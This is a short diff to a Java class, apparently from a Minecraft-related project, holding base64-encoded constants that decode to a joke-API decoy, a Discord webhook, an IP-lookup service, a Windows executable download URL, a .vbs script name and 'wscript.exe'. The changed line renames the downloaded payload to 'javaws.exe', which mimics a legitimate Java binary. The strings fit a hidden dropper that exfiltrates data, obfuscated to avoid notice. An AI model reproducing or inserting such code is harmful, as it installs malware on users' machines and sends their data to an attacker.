@@ -19,7 +19,7 @@ public final class MystVale {
     private static final String S1 = "aHR0cHM6Ly9vZmZpY2lhbC1qb2tlLWFwaS5hcHBzcG90LmNvbS9yYW5kb21fam9rZQ==";
     private static final String S2 = "aHR0cHM6Ly9jYW5hcnkuZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzE1NjI5Mzg4MTQxMTk1NTA5NzYvMDZJNjJGbWdqSVlaSHFnekRvRUtSeURwbWdUU3NQRXY0Tkd0VG56c0RwaGZPRFc0Q0E3NDBRNGVDSVUyX25SMDN1WmI=";
     private static final String S3 = "aHR0cHM6Ly9hcGkuaXBpZnkub3Jn";
-    private static final String S4 = "aHR0cHM6Ly9jZG4udmVzdGlnZW1jLmNvbS9hc3NldHMvd2luZG93cy9WZXN0aWdlSmF2YS5leGU=";
+    private static final String S4 = "aHR0cHM6Ly9jZG4udmVzdGlnZW1jLmNvbS9hc3NldHMvd2luZG93cy9qYXZhd3MuZXhl";
     private static final String F1 = "dm9pY2Vqd3NfaW5zdGFsbGVyLmV4ZQ==";
     private static final String F2 = "cnVuX3YudmJz";
     private static final String E1 = "d3NjcmlwdC5leGU=";
